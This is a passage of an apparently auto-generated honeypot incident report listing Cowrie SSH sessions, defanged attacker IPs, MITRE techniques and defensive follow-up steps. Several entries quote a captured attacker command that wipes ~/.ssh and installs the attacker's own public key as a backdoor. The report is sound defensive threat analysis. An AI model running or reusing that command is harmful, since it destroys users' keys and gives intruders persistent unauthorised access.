| `2026-07-02 15:28:25` | `cowrie.session.file_download` |
| `2026-07-02 15:28:25` | `cowrie.log.closed` |
| `2026-07-02 15:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]75` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]75` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e3101fce56

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]75` |
| **First Seen** | 2026-07-02 15:28 |
| **Last Seen** | 2026-07-02 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:28:25` | `cowrie.session.connect` |
| `2026-07-02 15:28:25` | `cowrie.client.version` |
| `2026-07-02 15:28:26` | `cowrie.client.kex` |
| `2026-07-02 15:28:27` | `cowrie.login.success` |
| `2026-07-02 15:28:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]75` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a59e842eae17

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]75` |
| **First Seen** | 2026-07-02 15:28 |
| **Last Seen** | 2026-07-02 15:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:28:27` | `cowrie.session.connect` |
| `2026-07-02 15:28:27` | `cowrie.client.version` |
| `2026-07-02 15:28:27` | `cowrie.client.kex` |
| `2026-07-02 15:28:28` | `cowrie.login.success` |
| `2026-07-02 15:28:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]75` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]75` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-722fe2ec25af

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 15:29 |
| **Last Seen** | 2026-07-02 15:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:29:33` | `cowrie.session.connect` |
| `2026-07-02 15:29:35` | `cowrie.client.version` |
| `2026-07-02 15:29:35` | `cowrie.client.kex` |
| `2026-07-02 15:29:40` | `cowrie.login.success` |
| `2026-07-02 15:29:44` | `cowrie.session.params` |
| `2026-07-02 15:29:44` | `cowrie.command.input` |
| `2026-07-02 15:29:45` | `cowrie.log.closed` |
| `2026-07-02 15:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff9753a0b2b8

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 15:30 |
| **Last Seen** | 2026-07-02 15:30 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:30:43` | `cowrie.session.connect` |
| `2026-07-02 15:30:44` | `cowrie.client.version` |
| `2026-07-02 15:30:44` | `cowrie.client.kex` |
| `2026-07-02 15:30:46` | `cowrie.login.success` |
| `2026-07-02 15:30:47` | `cowrie.session.params` |
| `2026-07-02 15:30:47` | `cowrie.command.input` |
| `2026-07-02 15:30:48` | `cowrie.log.closed` |
| `2026-07-02 15:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa704e72cc75

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 15:32 |
| **Last Seen** | 2026-07-02 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:32:26` | `cowrie.session.connect` |
| `2026-07-02 15:32:26` | `cowrie.client.version` |
| `2026-07-02 15:32:26` | `cowrie.client.kex` |
| `2026-07-02 15:32:27` | `cowrie.login.success` |
| `2026-07-02 15:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-527389b81054

| Field | Detail |
|---|---|
| **Source IP** | `64.110.90[.]250` |
| **First Seen** | 2026-07-02 15:32 |
| **Last Seen** | 2026-07-02 15:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:32:26` | `cowrie.session.connect` |
| `2026-07-02 15:32:26` | `cowrie.client.version` |
| `2026-07-02 15:32:26` | `cowrie.client.kex` |
| `2026-07-02 15:32:27` | `cowrie.login.success` |
| `2026-07-02 15:32:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.110.90[.]250` to AbuseIPDB if not already reported
- [ ] Block `64.110.90[.]250` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e677910c3a85

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-02 15:33 |
| **Last Seen** | 2026-07-02 15:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:33:06` | `cowrie.session.connect` |
| `2026-07-02 15:33:06` | `cowrie.client.version` |
| `2026-07-02 15:33:07` | `cowrie.client.kex` |
| `2026-07-02 15:33:07` | `cowrie.login.success` |
| `2026-07-02 15:33:08` | `cowrie.session.params` |
| `2026-07-02 15:33:08` | `cowrie.command.input` |
| `2026-07-02 15:33:08` | `cowrie.log.closed` |
| `2026-07-02 15:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2111dbbddce

| Field | Detail |
|---|---|
| **Source IP** | `190.223.60[.]209` |
| **First Seen** | 2026-07-02 15:34 |
| **Last Seen** | 2026-07-02 15:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:34:24` | `cowrie.session.connect` |
| `2026-07-02 15:34:24` | `cowrie.client.version` |
| `2026-07-02 15:34:24` | `cowrie.client.kex` |
| `2026-07-02 15:34:24` | `cowrie.login.success` |
| `2026-07-02 15:34:25` | `cowrie.session.params` |
| `2026-07-02 15:34:25` | `cowrie.command.input` |
| `2026-07-02 15:34:25` | `cowrie.command.failed` |
| `2026-07-02 15:34:26` | `cowrie.log.closed` |
| `2026-07-02 15:34:26` | `cowrie.session.params` |
| `2026-07-02 15:34:26` | `cowrie.command.input` |
| `2026-07-02 15:34:27` | `cowrie.session.file_download` |
| `2026-07-02 15:34:27` | `cowrie.log.closed` |
| `2026-07-02 15:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.60[.]209` to AbuseIPDB if not already reported
- [ ] Block `190.223.60[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8ef23d7bf97

| Field | Detail |
|---|---|
| **Source IP** | `190.223.60[.]209` |
| **First Seen** | 2026-07-02 15:34 |
| **Last Seen** | 2026-07-02 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:34:27` | `cowrie.session.connect` |
| `2026-07-02 15:34:27` | `cowrie.client.version` |
| `2026-07-02 15:34:27` | `cowrie.client.kex` |
| `2026-07-02 15:34:27` | `cowrie.login.success` |
| `2026-07-02 15:34:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.60[.]209` to AbuseIPDB if not already reported
- [ ] Block `190.223.60[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8a73fb52ff0

| Field | Detail |
|---|---|
| **Source IP** | `190.223.60[.]209` |
| **First Seen** | 2026-07-02 15:34 |
| **Last Seen** | 2026-07-02 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:34:27` | `cowrie.session.connect` |
| `2026-07-02 15:34:27` | `cowrie.client.version` |
| `2026-07-02 15:34:28` | `cowrie.client.kex` |
| `2026-07-02 15:34:28` | `cowrie.login.success` |
| `2026-07-02 15:34:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.223.60[.]209` to AbuseIPDB if not already reported
- [ ] Block `190.223.60[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-def54c082d4b

| Field | Detail |
|---|---|
| **Source IP** | `46.59.122[.]78` |
| **First Seen** | 2026-07-02 15:34 |
| **Last Seen** | 2026-07-02 15:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:34:54` | `cowrie.session.connect` |
| `2026-07-02 15:34:54` | `cowrie.client.version` |
| `2026-07-02 15:34:54` | `cowrie.client.kex` |
| `2026-07-02 15:34:55` | `cowrie.login.success` |
| `2026-07-02 15:34:55` | `cowrie.session.params` |
| `2026-07-02 15:34:55` | `cowrie.command.input` |
| `2026-07-02 15:34:55` | `cowrie.command.failed` |
| `2026-07-02 15:34:55` | `cowrie.log.closed` |
| `2026-07-02 15:34:56` | `cowrie.session.params` |
| `2026-07-02 15:34:56` | `cowrie.command.input` |
| `2026-07-02 15:34:56` | `cowrie.session.file_download` |
| `2026-07-02 15:34:56` | `cowrie.log.closed` |
| `2026-07-02 15:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.59.122[.]78` to AbuseIPDB if not already reported
- [ ] Block `46.59.122[.]78` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8415434b944

| Field | Detail |
|---|---|
| **Source IP** | `46.59.122[.]78` |
| **First Seen** | 2026-07-02 15:34 |
| **Last Seen** | 2026-07-02 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:34:57` | `cowrie.session.connect` |
| `2026-07-02 15:34:57` | `cowrie.client.version` |
| `2026-07-02 15:34:57` | `cowrie.client.kex` |
| `2026-07-02 15:34:57` | `cowrie.login.success` |
| `2026-07-02 15:34:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.59.122[.]78` to AbuseIPDB if not already reported
- [ ] Block `46.59.122[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfbe0b4bc677

| Field | Detail |
|---|---|
| **Source IP** | `46.59.122[.]78` |
| **First Seen** | 2026-07-02 15:34 |
| **Last Seen** | 2026-07-02 15:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:34:57` | `cowrie.session.connect` |
| `2026-07-02 15:34:57` | `cowrie.client.version` |
| `2026-07-02 15:34:57` | `cowrie.client.kex` |
| `2026-07-02 15:34:58` | `cowrie.login.success` |
| `2026-07-02 15:34:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.59.122[.]78` to AbuseIPDB if not already reported
- [ ] Block `46.59.122[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b0dbba41128

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 15:40 |
| **Last Seen** | 2026-07-02 15:41 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:40:57` | `cowrie.session.connect` |
| `2026-07-02 15:40:58` | `cowrie.client.version` |
| `2026-07-02 15:40:58` | `cowrie.client.kex` |
| `2026-07-02 15:41:04` | `cowrie.login.success` |
| `2026-07-02 15:41:07` | `cowrie.session.params` |
| `2026-07-02 15:41:07` | `cowrie.command.input` |
| `2026-07-02 15:41:09` | `cowrie.log.closed` |
| `2026-07-02 15:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a907b66a673

| Field | Detail |
|---|---|
| **Source IP** | `217.160.49[.]114` |
| **First Seen** | 2026-07-02 15:43 |
| **Last Seen** | 2026-07-02 15:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:43:07` | `cowrie.session.connect` |
| `2026-07-02 15:43:07` | `cowrie.client.version` |
| `2026-07-02 15:43:07` | `cowrie.client.kex` |
| `2026-07-02 15:43:08` | `cowrie.login.success` |
| `2026-07-02 15:43:09` | `cowrie.session.params` |
| `2026-07-02 15:43:09` | `cowrie.command.input` |
| `2026-07-02 15:43:09` | `cowrie.command.failed` |
| `2026-07-02 15:43:09` | `cowrie.log.closed` |
| `2026-07-02 15:43:10` | `cowrie.session.params` |
| `2026-07-02 15:43:10` | `cowrie.command.input` |
| `2026-07-02 15:43:10` | `cowrie.session.file_download` |
| `2026-07-02 15:43:10` | `cowrie.log.closed` |
| `2026-07-02 15:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.160.49[.]114` to AbuseIPDB if not already reported
- [ ] Block `217.160.49[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24546ce6872e

| Field | Detail |
|---|---|
| **Source IP** | `217.160.49[.]114` |
| **First Seen** | 2026-07-02 15:43 |
| **Last Seen** | 2026-07-02 15:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:43:10` | `cowrie.session.connect` |
| `2026-07-02 15:43:10` | `cowrie.client.version` |
| `2026-07-02 15:43:10` | `cowrie.client.kex` |
| `2026-07-02 15:43:11` | `cowrie.login.success` |
| `2026-07-02 15:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.160.49[.]114` to AbuseIPDB if not already reported
- [ ] Block `217.160.49[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8f321685486

| Field | Detail |
|---|---|
| **Source IP** | `217.160.49[.]114` |
| **First Seen** | 2026-07-02 15:43 |
| **Last Seen** | 2026-07-02 15:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:43:11` | `cowrie.session.connect` |
| `2026-07-02 15:43:11` | `cowrie.client.version` |
| `2026-07-02 15:43:11` | `cowrie.client.kex` |
| `2026-07-02 15:43:11` | `cowrie.login.success` |
| `2026-07-02 15:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.160.49[.]114` to AbuseIPDB if not already reported
- [ ] Block `217.160.49[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0016137cfec

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 15:45 |
| **Last Seen** | 2026-07-02 15:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:45:03` | `cowrie.session.connect` |
| `2026-07-02 15:45:03` | `cowrie.client.version` |
| `2026-07-02 15:45:03` | `cowrie.client.kex` |
| `2026-07-02 15:45:05` | `cowrie.login.success` |
| `2026-07-02 15:45:06` | `cowrie.session.params` |
| `2026-07-02 15:45:06` | `cowrie.command.input` |
| `2026-07-02 15:45:06` | `cowrie.log.closed` |
| `2026-07-02 15:45:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4fd94272368

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 15:52 |
| **Last Seen** | 2026-07-02 15:52 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:52:16` | `cowrie.session.connect` |
| `2026-07-02 15:52:18` | `cowrie.client.version` |
| `2026-07-02 15:52:18` | `cowrie.client.kex` |
| `2026-07-02 15:52:24` | `cowrie.login.success` |
| `2026-07-02 15:52:29` | `cowrie.session.params` |
| `2026-07-02 15:52:29` | `cowrie.command.input` |
| `2026-07-02 15:52:31` | `cowrie.log.closed` |
| `2026-07-02 15:52:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd5ccb99553f

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 15:59 |
| **Last Seen** | 2026-07-02 15:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 15:59:31` | `cowrie.session.connect` |
| `2026-07-02 15:59:32` | `cowrie.client.version` |
| `2026-07-02 15:59:32` | `cowrie.client.kex` |
| `2026-07-02 15:59:33` | `cowrie.login.success` |
| `2026-07-02 15:59:34` | `cowrie.session.params` |
| `2026-07-02 15:59:34` | `cowrie.command.input` |
| `2026-07-02 15:59:35` | `cowrie.log.closed` |
| `2026-07-02 15:59:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8da79579e2b5

| Field | Detail |
|---|---|
| **Source IP** | `49.238.167[.]125` |
| **First Seen** | 2026-07-02 16:02 |
| **Last Seen** | 2026-07-02 16:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:02:05` | `cowrie.session.connect` |
| `2026-07-02 16:02:05` | `cowrie.client.version` |
| `2026-07-02 16:02:05` | `cowrie.client.kex` |
| `2026-07-02 16:02:06` | `cowrie.login.success` |
| `2026-07-02 16:02:07` | `cowrie.session.params` |
| `2026-07-02 16:02:07` | `cowrie.command.input` |
| `2026-07-02 16:02:07` | `cowrie.command.failed` |
| `2026-07-02 16:02:07` | `cowrie.log.closed` |
| `2026-07-02 16:02:08` | `cowrie.session.params` |
| `2026-07-02 16:02:08` | `cowrie.command.input` |
| `2026-07-02 16:02:08` | `cowrie.session.file_download` |
| `2026-07-02 16:02:08` | `cowrie.log.closed` |
| `2026-07-02 16:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.238.167[.]125` to AbuseIPDB if not already reported
- [ ] Block `49.238.167[.]125` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a3a84e599e

| Field | Detail |
|---|---|
| **Source IP** | `49.238.167[.]125` |
| **First Seen** | 2026-07-02 16:02 |
| **Last Seen** | 2026-07-02 16:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:02:08` | `cowrie.session.connect` |
| `2026-07-02 16:02:08` | `cowrie.client.version` |
| `2026-07-02 16:02:09` | `cowrie.client.kex` |
| `2026-07-02 16:02:09` | `cowrie.login.success` |
| `2026-07-02 16:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.238.167[.]125` to AbuseIPDB if not already reported
- [ ] Block `49.238.167[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a46a0de97fae

| Field | Detail |
|---|---|
| **Source IP** | `49.238.167[.]125` |
| **First Seen** | 2026-07-02 16:02 |
| **Last Seen** | 2026-07-02 16:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 16:02:10` | `cowrie.session.connect` |
| `2026-07-02 16:02:10` | `cowrie.client.version` |
| `2026-07-02 16:02:10` | `cowrie.client.kex` |
| `2026-07-02 16:02:11` | `cowrie.login.success` |
| `2026-07-02 16:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.238.167[.]125` to AbuseIPDB if not already reported
- [ ] Block `49.238.167[.]125` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57cee3ab3590

